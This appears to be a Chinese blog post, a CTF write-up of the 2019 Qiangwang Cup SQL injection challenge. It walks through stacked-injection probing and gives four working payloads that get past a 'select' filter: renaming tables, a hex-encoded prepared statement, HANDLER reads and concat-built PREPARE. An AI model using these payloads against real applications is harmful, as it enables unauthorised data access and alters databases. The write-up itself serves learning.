@@ -1,0 +1,747 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    [强网杯 2019]随便注 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="判断闭合方式 看题目这是一个sql注入题  通过get传参来获取数据 那我们首先来判断注入类型 1234输入1-&gt;正常回显输入1&#x27;-&gt;报错输入1“-&gt;正常回显总结：这是一个字符型注入，且用单引号闭合  判断过滤信息 但当我们输入select时，它回显内容为：  告诉我们select已被过滤了，不能使用联合注入、报错注入  查找所能得到的信息 那我们还剩下一个堆叠注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[强网杯 2019]随便注">
+<meta property="og:url" content="http://example.com/2025/03/12/[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="判断闭合方式 看题目这是一个sql注入题  通过get传参来获取数据 那我们首先来判断注入类型 1234输入1-&gt;正常回显输入1&#x27;-&gt;报错输入1“-&gt;正常回显总结：这是一个字符型注入，且用单引号闭合  判断过滤信息 但当我们输入select时，它回显内容为：  告诉我们select已被过滤了，不能使用联合注入、报错注入  查找所能得到的信息 那我们还剩下一个堆叠注入">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/03/12/images/20250312200912887.png">
+<meta property="og:image" content="http://example.com/2025/03/12/images/20250312201237079.png">
+<meta property="og:image" content="http://example.com/2025/03/12/images/20250312194056176.png">
+<meta property="og:image" content="http://example.com/2025/03/12/images/20250312202105623.png">
+<meta property="og:image" content="http://example.com/2025/03/12/images/20250312202232744.png">
+<meta property="og:image" content="http://example.com/2025/03/12/images/20250312203837765.png">
+<meta property="article:published_time" content="2025-03-12T11:39:25.000Z">
+<meta property="article:modified_time" content="2025-03-16T12:00:56.643Z">
+<meta property="article:author" content="fuboy">
+<meta property="article:tag" content="SQL">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/03/12/images/20250312200912887.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture></picture>
+    <img fetchpriority="high" src="/../images/17373827994914.jpg" alt="[强网杯 2019]随便注">
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">[强网杯 2019]随便注</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F"><span class="toc-number">1.</span> <span class="toc-text"> 判断闭合方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E8%BF%87%E6%BB%A4%E4%BF%A1%E6%81%AF"><span class="toc-number">2.</span> <span class="toc-text"> 判断过滤信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E6%89%80%E8%83%BD%E5%BE%97%E5%88%B0%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-number">3.</span> <span class="toc-text"> 查找所能得到的信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E8%A7%A3%E9%A2%98"><span class="toc-number">4.</span> <span class="toc-text"> 关键解题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%B8%80%E9%87%8D%E6%9E%84%E6%8D%A2%E8%A1%A8"><span class="toc-number">4.1.</span> <span class="toc-text"> 法一(重构换表)：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%E7%BC%96%E7%A0%81%E9%80%83%E9%80%B8%E7%BB%95%E8%BF%87%E6%BB%A4"><span class="toc-number">4.2.</span> <span class="toc-text"> 法二(编码逃逸绕过滤)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%B8%89hander"><span class="toc-number">4.3.</span> <span class="toc-text"> 法三(hander)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E5%9B%9B%E9%A2%84%E7%BC%96%E8%AF%91"><span class="toc-number">4.4.</span> <span class="toc-text"> 法四(预编译)</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="fuboy" class="lazyload">
+  <div class="sidebar-author-name">fuboy</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">38</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">18</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-[强网杯 2019]随便注" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/03/12/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-03-12T11:39:25.000Z" itemprop="datePublished">2025-03-12</time>
+    <time style="display: none;" id="post-update-time">2025-03-16</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%88%B7%E9%A2%98/" data-aos="zoom-in">刷题</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h2 id="判断闭合方式"><a class="markdownIt-Anchor" href="#判断闭合方式"></a> 判断闭合方式</h2>
+<p>看题目这是一个sql注入题</p>
+<p><img src="../images/20250312200912887.png" alt="image-20250312200912887" /></p>
+<p>通过get传参来获取数据</p>
+<p>那我们首先来判断注入类型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入1-&gt;正常回显</span><br><span class="line">输入1&#x27;-&gt;报错</span><br><span class="line">输入1“-&gt;正常回显</span><br><span class="line">总结：这是一个字符型注入，且用单引号闭合</span><br></pre></td></tr></table></figure>
+<h2 id="判断过滤信息"><a class="markdownIt-Anchor" href="#判断过滤信息"></a> 判断过滤信息</h2>
+<p>但当我们输入select时，它回显内容为：</p>
+<p><img src="../images/20250312201237079.png" alt="image-20250312201237079" /></p>
+<p>告诉我们select已被过滤了，<strong>不能使用联合注入、报错注入</strong></p>
+<h2 id="查找所能得到的信息"><a class="markdownIt-Anchor" href="#查找所能得到的信息"></a> 查找所能得到的信息</h2>
+<p>那我们还剩下一个<strong>堆叠注入</strong></p>
+<p>输入<code>';show databases;</code></p>
+<p>回显出了<strong>数据库信息</strong></p>
+<p><img src="../images/20250312194056176.png" alt="image-20250312194056176" /></p>
+<p>输入<code>';show tables;</code></p>
+<p>回显出了表信息</p>
+<p><img src="../images/20250312202105623.png" alt="image-20250312202105623" /></p>
+<p>输入<code>';show columns from 1919810931114514;</code></p>
+<p>回显出了<strong>字段信息</strong>，同时发现flag</p>
+<p><strong>注意：纯数字要加反引号，不然查不到</strong></p>
+<p><img src="../images/20250312202232744.png" alt="image-20250312202232744" /></p>
+<p>我们输入<code>';show columns from words;</code></p>
+<p>回显出来有id字段和data字段，不就和我们原查询语句一致吗</p>
+<p>那我们猜测后台查询语句为：</p>
+<p><code>select * from words where id='$_GET[inject]'</code></p>
+<p><img src="../images/20250312203837765.png" alt="image-20250312203837765" /></p>
+<p>现在面临一个很尴尬的问题，查询字段里的数据信息要用select，但被过滤了</p>
+<p>没办法了，大佬wp登场</p>
+<h2 id="关键解题"><a class="markdownIt-Anchor" href="#关键解题"></a> 关键解题</h2>
+<h3 id="法一重构换表"><a class="markdownIt-Anchor" href="#法一重构换表"></a> 法一(重构换表)：</h3>
+<p>既然已知后台查询语句为<code>select * from words where id='$_GET[inject]'</code></p>
+<p>而我们查询191那个表中的flag字段信息又要使用select</p>
+<p>那我们可以考虑用原语句中的select来查询我们所需要的数据</p>
+<p>它原来是在words表里查询</p>
+<p>那我们可以通过rename函数进行改表，把<code>1919810931114514</code>改为words，增加新字段id，将flag改为data，将刚开始那个words表改为其他任意表。</p>
+<p>解释：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">原来：</span><br><span class="line">words:</span><br><span class="line">id int</span><br><span class="line">data varchar</span><br><span class="line"></span><br><span class="line">1919810931114514:</span><br><span class="line">? varchar</span><br><span class="line"></span><br><span class="line">改表：</span><br><span class="line">word2(原words)：</span><br><span class="line">id int</span><br><span class="line">data varchar</span><br><span class="line"></span><br><span class="line">words(原1919810931114514):</span><br><span class="line">id int</span><br><span class="line">data varchar(原?字段)</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;rename table words to word2;rename table `1919810931114514` to words;ALTER TABLE words ADD id int(10) DEFAULT &#x27;12&#x27;;ALTER TABLE  words CHANGE flag data VARCHAR(100);#</span><br></pre></td></tr></table></figure>
+<p>然后输入万能密码，flag就出来了</p>
+<p>不知道为什么，我输入payload后就无法执行了</p>
+<p>这个方法就作为一个解题思路吧</p>
+<h3 id="法二编码逃逸绕过滤"><a class="markdownIt-Anchor" href="#法二编码逃逸绕过滤"></a> 法二(编码逃逸绕过滤)</h3>
+<p>由于select被过滤</p>
+<p>那我们只要考虑将select编码绕过即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *from where `1919810931114514`</span><br></pre></td></tr></table></figure>
+<p>将这个16进制编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">73656c656374202a66726f6d20776865726520603139313938313039333131313435313460</span><br></pre></td></tr></table></figure>
+<p>最终payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</span><br><span class="line"></span><br><span class="line">prepare…from…是预处理语句，会进行编码转换。</span><br><span class="line">execute用来执行由SQLPrepare创建的SQL语句。</span><br><span class="line">SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。</span><br><span class="line">0x就是把后面的编码格式转换成16进制编码格式</span><br><span class="line">那么总体理解就是，使用SeT方法给变量a赋值，给a变量赋的值就是select查询1919810931114514表的所有内容语句编码后的值，execsql方法执行来自a变量的值，prepare…from方法将执行后的编码变换成字符串格式，execute方法调用并执行execsql方法。</span><br></pre></td></tr></table></figure>
+<h3 id="法三hander"><a class="markdownIt-Anchor" href="#法三hander"></a> 法三(hander)</h3>
+<p>select命令被过滤了怎么办？我们还可以用handler命令进行查看，handler命令可以一行一行的显示数据表中的内容。</p>
+<p><strong>header是MYSQL特有的语法</strong></p>
+<p>构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HANDLER 1919810931114514 OPEN;</span><br><span class="line">打开名为 1919810931114514 的表，准备对其进行操作。</span><br><span class="line"></span><br><span class="line">HANDLER 1919810931114514 READ FIRST;</span><br><span class="line">读取表中的第一行数据。</span><br><span class="line"></span><br><span class="line">HANDLER 1919810931114514 CLOSE;</span><br><span class="line">关闭之前打开的表。</span><br></pre></td></tr></table></figure>
+<h3 id="法四预编译"><a class="markdownIt-Anchor" href="#法四预编译"></a> 法四(预编译)</h3>
+<p>因为select关键字被过滤了，所以我们可以通过<a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?content_id=209402995&amp;content_type=Article&amp;match_order=1&amp;q=%E9%A2%84%E7%BC%96%E8%AF%91&amp;zhida_source=entity">预编译</a>的方式拼接select 关键字：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;PREPARE hacker from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; * from `1919810931114514` &#x27;);EXECUTE hacker;#</span><br></pre></td></tr></table></figure>
+<ol>
+<li><strong><code>PREPARE hacker FROM concat('s','elect', ' \* from </code>1919810931114514<code> ');</code></strong>
+<ul>
+<li><code>PREPARE</code> 是SQL中的预处理语句命令，用于创建一个预编译的SQL语句。</li>
+<li><code>hacker</code> 是预处理语句的名称。</li>
+<li><code>concat('s','elect', ' * from </code>1919810931114514<code> ')</code> 使用<code>concat</code>函数拼接字符串，生成<code>select * from 1919810931114514</code>。</li>
+<li>最终生成的SQL语句是：<code>select * from 1919810931114514</code>。</li>
+</ul>
+</li>
+<li><strong><code>EXECUTE hacker;</code></strong>
+<ul>
+<li>执行名为<code>hacker</code>的预处理语句，即执行<code>select * from 1919810931114514</code>。</li>
+</ul>
+</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/SQL/" rel="tag">SQL</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="[RoarCTF 2019]Easy Calc" class="lazyload">
+        
+        <a href="/2025/03/13/%5BRoarCTF%202019%5DEasy%20Calc/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            [RoarCTF 2019]Easy Calc
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="../images/1737907114de8a.jpg" data-sizes="auto" alt="[GXYCTF2019]Ping Ping Ping" class="lazyload">
+        
+      
+      <a href="/2025/03/11/%5BGXYCTF2019%5DPing%20Ping%20Ping/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          [GXYCTF2019]Ping Ping Ping
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep rotate"></span>
+      fuboy
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        62.9k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        04:11
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F"><span class="toc-number">1.</span> <span class="toc-text"> 判断闭合方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E8%BF%87%E6%BB%A4%E4%BF%A1%E6%81%AF"><span class="toc-number">2.</span> <span class="toc-text"> 判断过滤信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E6%89%80%E8%83%BD%E5%BE%97%E5%88%B0%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-number">3.</span> <span class="toc-text"> 查找所能得到的信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E8%A7%A3%E9%A2%98"><span class="toc-number">4.</span> <span class="toc-text"> 关键解题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%B8%80%E9%87%8D%E6%9E%84%E6%8D%A2%E8%A1%A8"><span class="toc-number">4.1.</span> <span class="toc-text"> 法一(重构换表)：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%E7%BC%96%E7%A0%81%E9%80%83%E9%80%B8%E7%BB%95%E8%BF%87%E6%BB%A4"><span class="toc-number">4.2.</span> <span class="toc-text"> 法二(编码逃逸绕过滤)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%B8%89hander"><span class="toc-number">4.3.</span> <span class="toc-text"> 法三(hander)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E5%9B%9B%E9%A2%84%E7%BC%96%E8%AF%91"><span class="toc-number">4.4.</span> <span class="toc-text"> 法四(预编译)</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="fuboy" class="lazyload">
+  <div class="sidebar-author-name">fuboy</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">38</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">18</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
